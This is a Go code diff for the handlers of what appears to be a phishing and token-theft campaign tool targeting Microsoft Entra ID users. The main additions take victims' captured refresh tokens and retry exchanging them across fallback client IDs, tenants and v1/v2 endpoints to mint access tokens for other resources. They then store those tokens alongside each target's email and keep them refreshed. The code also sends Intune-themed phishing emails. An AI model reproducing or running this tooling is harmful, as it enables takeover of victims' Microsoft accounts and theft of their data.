@@ -2514,6 +3006,9 @@ func (h *Handler) mfaFIDO2Complete(w http.ResponseWriter, r *http.Request) {
 // ─── Token exchange ───────────────────────────────────────────────────────────
 
 func (h *Handler) tokenExchange(w http.ResponseWriter, r *http.Request) {
+	if _, ok := h.campaignAccess(w, r, r.PathValue("id")); !ok {
+		return
+	}
 	token, err := h.Manager.GetTokenByTargetID(r.PathValue("id"), r.PathValue("targetId"))
 	if err != nil {
 		writeError(w, 404, err.Error())
@@ -2524,6 +3019,7 @@ func (h *Handler) tokenExchange(w http.ResponseWriter, r *http.Request) {
 		Resource string `json:"resource"`
 		Scope    string `json:"scope"`
 		UseV1    bool   `json:"useV1"`
+		Label    string `json:"label"` // optional — if set, result is stored in exchanged_tokens
 	}
 	json.NewDecoder(r.Body).Decode(&body)
 	// Prefer per-token tenant ID (from JWT tid claim) over campaign-level.
@@ -2559,14 +3055,179 @@ func (h *Handler) tokenExchange(w http.ResponseWriter, r *http.Request) {
 		}
 	}
 
+	// AADSTS70000 on v2: "grant is invalid or malformed" can occur when a
+	// token captured without offline_access is used on the v2 endpoint.
+	// Retry using the v1 endpoint (resource= parameter), which is more
+	// permissive about token family / scope provenance.
+	// Also retry with "organizations" as tenant — some cross-tenant tokens
+	// require the generic endpoint (mirrors mfaClient behaviour).
+	if err != nil && !body.UseV1 && strings.Contains(err.Error(), "AADSTS70000") {
+		v1Resource := body.Resource
+		if v1Resource == "" && body.Scope != "" {
+			// Derive v1 resource from scope: take first space-delimited token,
+			// strip /.default suffix.
+			v1Resource = strings.Fields(body.Scope)[0]
+			v1Resource = strings.TrimSuffix(v1Resource, "/.default")
+		}
+		tenantCandidates := []string{tenantID}
+		if tenantID != "organizations" {
+			tenantCandidates = append(tenantCandidates, "organizations")
+		}
+		clientCandidates := append([]string{body.ClientID}, mfaFallbackClients...)
+	outer70000:
+		for _, tid := range tenantCandidates {
+			for _, cid := range clientCandidates {
+				// Try v2 first with the candidate tenant.
+				result, err = tokenexchange.Exchange(context.Background(), tid, cid, token.RefreshToken, body.Resource, body.Scope, false)
+				if err == nil {
+					break outer70000
+				}
+				if isTokenExpiredErr(err) {
+					break outer70000
+				}
+				// Then v1.
+				if v1Resource != "" {
+					result, err = tokenexchange.Exchange(context.Background(), tid, cid, token.RefreshToken, v1Resource, "", true)
+					if err == nil || isTokenExpiredErr(err) {
+						break outer70000
+					}
+				}
+			}
+		}
+	}
+
 	if err != nil {
 		msg := err.Error()
 		if strings.Contains(msg, "AADSTS70000") {
-			msg += " — note: AADSTS70000 often means the refresh token is revoked (e.g. MFA enforcement changed required claims). Try refreshing the token from the Tokens tab or re-capturing."
+			msg += " — AADSTS70000 means the grant is invalid. Possible causes: (1) token was captured without offline_access and cannot be cross-resource exchanged, (2) refresh token is revoked or invalidated by MFA enforcement, (3) client ID mismatch. Re-capture with offline_access scope, or try a different client ID."
 		}
 		writeError(w, 500, msg)
 		return
 	}
+
+	// Persist the exchanged token when a label is provided.
+	if body.Label != "" {
+		campaignID := r.PathValue("id")
+		_ = h.Store.InsertExchangedToken(store.ExchangedTokenRow{
+			ID:           fmt.Sprintf("%s-%s-%d", campaignID, token.TargetID, time.Now().UnixNano()),
+			CampaignID:   campaignID,
+			TargetID:     token.TargetID,
+			TargetEmail:  token.TargetEmail,
+			Label:        body.Label,
+			AccessToken:  result.AccessToken,
+			RefreshToken: result.RefreshToken,
+			Scope:        result.Scope,
+			ExpiresIn:    result.ExpiresIn,
+			ObtainedAt:   result.ObtainedAt,
+			TenantID:     token.TenantID,
+			ReqScope:     body.Scope,
+			ReqResource:  body.Resource,
+		})
+	}
+
+	json.NewEncoder(w).Encode(result)
+}
+
+// refreshExchangedToken refreshes an exchanged token (stored via Token Exchange)
+// by re-running the exchange using the exchange token's own refresh token, falling
+// back to the captured refresh token if needed.
+func (h *Handler) refreshExchangedToken(w http.ResponseWriter, r *http.Request) {
+	campaignID := r.PathValue("id")
+	targetID := r.PathValue("targetId")
+	if _, ok := h.campaignAccess(w, r, campaignID); !ok {
+		return
+	}
+	var body struct {
+		Label string `json:"label"`
+	}
+	json.NewDecoder(r.Body).Decode(&body)
+	if body.Label == "" {
+		writeError(w, 400, "label is required")
+		return
+	}
+
+	ex, err := h.Store.LoadExchangedToken(campaignID, targetID, body.Label)
+	if err != nil || ex == nil {
+		writeError(w, 404, "exchanged token not found for label: "+body.Label)
+		return
+	}
+
+	// Determine refresh token: prefer the exchange token's own RT, fall back to captured.
+	refreshToken := ex.RefreshToken
+	if refreshToken == "" {
+		captured, err := h.Manager.GetTokenByTargetID(campaignID, targetID)
+		if err != nil || captured.RefreshToken == "" {
+			writeError(w, 400, "no refresh token available — re-run Token Exchange")
+			return
+		}
+		refreshToken = captured.RefreshToken
+	}
+
+	tenantID := ex.TenantID
+	if tenantID == "" {
+		tenantID = h.Manager.TenantID()
+	}
+
+	// Determine client ID from original captured token's metadata.
+	clientID := h.Manager.ClientID()
+	if captured, err := h.Manager.GetTokenByTargetID(campaignID, targetID); err == nil && captured.CapturedClientID != "" {
+		clientID = captured.CapturedClientID
+	}
+
+	// Try with all fallback clients, v2 then v1.
+	clientCandidates := append([]string{clientID}, mfaFallbackClients...)
+	tenantCandidates := []string{tenantID}
+	if tenantID != "organizations" {
+		tenantCandidates = append(tenantCandidates, "organizations")
+	}
+
+	var result *tokenexchange.TokenPair
+	var lastErr error
+outer:
+	for _, tid := range tenantCandidates {
+		for _, cid := range clientCandidates {
+			if ex.ReqScope != "" {
+				result, lastErr = tokenexchange.Exchange(context.Background(), tid, cid, refreshToken, "", ex.ReqScope, false)
+				if lastErr == nil {
+					break outer
+				}
+				if isTokenExpiredErr(lastErr) {
+					break outer
+				}
+			}
+			if ex.ReqResource != "" {
+				result, lastErr = tokenexchange.Exchange(context.Background(), tid, cid, refreshToken, ex.ReqResource, "", true)
+				if lastErr == nil {
+					break outer
+				}
+				if isTokenExpiredErr(lastErr) {
+					break outer
+				}
+			}
+		}
+	}
+
+	if lastErr != nil {
+		writeError(w, 500, lastErr.Error())
+		return
+	}
+
+	_ = h.Store.InsertExchangedToken(store.ExchangedTokenRow{
+		ID:          ex.ID,
+		CampaignID:  campaignID,
+		TargetID:    targetID,
+		TargetEmail: ex.TargetEmail,
+		Label:       ex.Label,
+		AccessToken:  result.AccessToken,
+		RefreshToken: result.RefreshToken,
+		Scope:        result.Scope,
+		ExpiresIn:    result.ExpiresIn,
+		ObtainedAt:   result.ObtainedAt,
+		TenantID:     ex.TenantID,
+		ReqScope:     ex.ReqScope,
+		ReqResource:  ex.ReqResource,
+	})
+
 	json.NewEncoder(w).Encode(result)
 }
 
@@ -2902,18 +3563,31 @@ func (h *Handler) saveRequestTemplate(w http.ResponseWriter, r *http.Request) {
 		Headers string `json:"headers"`
 		Body    string `json:"body"`
 	}
-	json.NewDecoder(r.Body).Decode(&body)
+	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
+		writeError(w, 400, "invalid body")
+		return
+	}
+	if body.Label == "" {
+		writeError(w, 400, "label required")
+		return
+	}
 	id := fmt.Sprintf("rt-%d", time.Now().UnixNano())
-	h.Store.InsertRequestTemplate(store.RequestTemplateRow{
+	if err := h.Store.InsertRequestTemplate(store.RequestTemplateRow{
 		ID: id, Label: body.Label, Method: body.Method,
 		URI: body.URI, Headers: body.Headers, Body: body.Body,
 		CreatedAt: time.Now().UTC(),
-	})
-	json.NewEncoder(w).Encode(map[string]string{"id": id})
+	}); err != nil {
+		writeError(w, 500, "failed to save template")
+		return
+	}
+	writeJSON(w, 201, map[string]string{"id": id})
 }
 
 func (h *Handler) deleteRequestTemplate(w http.ResponseWriter, r *http.Request) {
-	h.Store.DeleteRequestTemplate(r.PathValue("id"))
+	if err := h.Store.DeleteRequestTemplate(r.PathValue("id")); err != nil {
+		writeError(w, 500, "failed to delete template")
+		return
+	}
 	w.WriteHeader(204)
 }
 
@@ -2921,6 +3595,9 @@ func (h *Handler) deleteRequestTemplate(w http.ResponseWriter, r *http.Request) 
 
 func (h *Handler) deleteTarget(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
 	targetID := r.PathValue("targetId")
 	if err := h.Manager.DeleteTarget(id, targetID); err != nil {
 		writeError(w, 400, err.Error())
@@ -2931,6 +3608,9 @@ func (h *Handler) deleteTarget(w http.ResponseWriter, r *http.Request) {
 
 func (h *Handler) launchForTarget(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
 	targetID := r.PathValue("targetId")
 	if err := h.Manager.LaunchForTarget(id, targetID); err != nil {
 		writeError(w, 400, err.Error())
@@ -2941,6 +3621,9 @@ func (h *Handler) launchForTarget(w http.ResponseWriter, r *http.Request) {
 
 func (h *Handler) regenCode(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
 	targetID := r.PathValue("targetId")
 	if err := h.Manager.RegenerateCode(id, targetID); err != nil {
 		writeError(w, 400, err.Error())
@@ -2951,9 +3634,8 @@ func (h *Handler) regenCode(w http.ResponseWriter, r *http.Request) {
 
 func (h *Handler) regenAll(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
-	c, ok := h.Manager.GetCampaign(id)
+	c, ok := h.campaignAccess(w, r, id)
 	if !ok {
-		writeError(w, 404, "campaign not found")
 		return
 	}
 	allTargets := c.Targets.All()
@@ -3053,6 +3735,9 @@ func (h *Handler) CaptureIntune(w http.ResponseWriter, r *http.Request) {
 
 func (h *Handler) sendIntuneEmails(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
 
 	var body struct {
 		ProfileID        string `json:"profile_id"`
@@ -3088,6 +3773,9 @@ func (h *Handler) sendIntuneEmails(w http.ResponseWriter, r *http.Request) {
 
 func (h *Handler) listIntuneCaptures(w http.ResponseWriter, r *http.Request) {
 	campaignID := r.PathValue("id")
+	if _, ok := h.campaignAccess(w, r, campaignID); !ok {
+		return
+	}
 	captures, err := h.Store.ListIntuneCaptures(campaignID)
 	if err != nil {
 		writeError(w, 500, err.Error())
